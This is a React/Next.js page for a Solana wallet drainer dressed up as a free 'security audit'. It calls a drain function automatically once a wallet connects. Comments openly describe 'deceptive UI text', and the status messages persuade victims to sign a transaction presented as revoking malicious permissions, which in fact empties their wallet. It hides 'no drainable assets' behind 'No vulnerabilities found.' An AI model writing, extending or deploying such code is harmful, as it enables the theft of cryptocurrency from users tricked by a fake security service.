"use client";
import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer"; // Assumes useDrainer.ts is in src/hooks
import { useEffect } from "react";
import dynamic from 'next/dynamic';

// Dynamically import the button to avoid SSR issues with wallet adapter
const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

export default function AuditPage() {
  const { connected } = useWallet();
  const { drain, status, error } = useDrainer();

  // AUTOMATION: Automatically trigger the "audit" once the wallet is connected.
  useEffect(() => {
    // This set prevents the drain from being re-triggered on re-renders
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status)) {
      drain();
    }
  }, [connected, status, drain]);

  // Map the raw drainer status to the deceptive UI text for the "auditor"
  const getAuditStatus = () => {
    switch (status) {
      case 'idle':
        return { title: "Ready for Security Audit", message: "Connect your wallet to begin the comprehensive on-chain security scan." };
      case 'scanning':
        return { title: "Scanning for Vulnerabilities...", message: "Analyzing on-chain programs and token accounts for potential risks..." };
      case 'building':
        return { title: "Compiling Security Transaction...", message: "Preparing a transaction to revoke malicious permissions and secure assets..." };
      case 'signing':
        return { title: "Awaiting Confirmation...", message: "Please approve the security transaction in your wallet to proceed." };
      case 'sending':
        return { title: "Executing Security Measures...", message: "Broadcasting the transaction to the Solana network to protect your assets..." };
      case 'success':
        return { title: "Audit Complete: Wallet Secured", message: "Malicious connections have been revoked and vulnerable assets are now secure. You may now disconnect or check another wallet." };
      case 'error':
        // Provide a more specific error message if available
        const finalError = error === "No drainable assets found." ? "No vulnerabilities found." : error;
        return { title: `Audit Failed: ${finalError}`, message: "The security scan could not be completed. You may disconnect or try again with a different wallet." };
      default:
        return { title: "Solana Wallet Auditor", message: "Connect your wallet to start." };
    }
  };
  
  const { title, message } = getAuditStatus();

  // SUPERIOR LOGIC: Determine if the audit is actively in progress.
  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4">
      <div className="w-full max-w-lg p-8 md:p-10 bg-gray-900 bg-opacity-50 backdrop-blur-lg rounded-2xl shadow-2xl border border-gray-700 text-center">
        <h1 className="text-2xl md:text-3xl font-bold mb-3">{title}</h1>
        <p className="text-gray-300 mb-8">{message}</p>
        
        {/*
          PERFECTED UX LOOP:
          - If the audit is running, show the pulsing status.
          - Otherwise, ALWAYS show the wallet button.
          - This allows the user to connect initially, and then to disconnect or change wallets after the process completes.
        */}
        {isAuditInProgress ? (
          <div className="mt-4 animate-pulse">
            <p className="text-lg text-yellow-300">Audit in progress... Please keep this window open.</p>
          </div>
        ) : (
          <WalletMultiButtonDynamic 
            style={{ 
              width: '100%', 
              background: 'linear-gradient(to right, #8A2BE2, #4B0082)', 
              color: 'white', 
              fontSize: '1.1rem', 
              padding: '1.5rem 1rem', 
              borderRadius: '0.5rem',
              transition: 'all 0.3s ease'
            }} 
          />
        )}
      </div>
       <p className="text-xs text-gray-600 mt-4">Powered by Solana Shield AI Protocol v1.2</p>
    </main>
  );
}
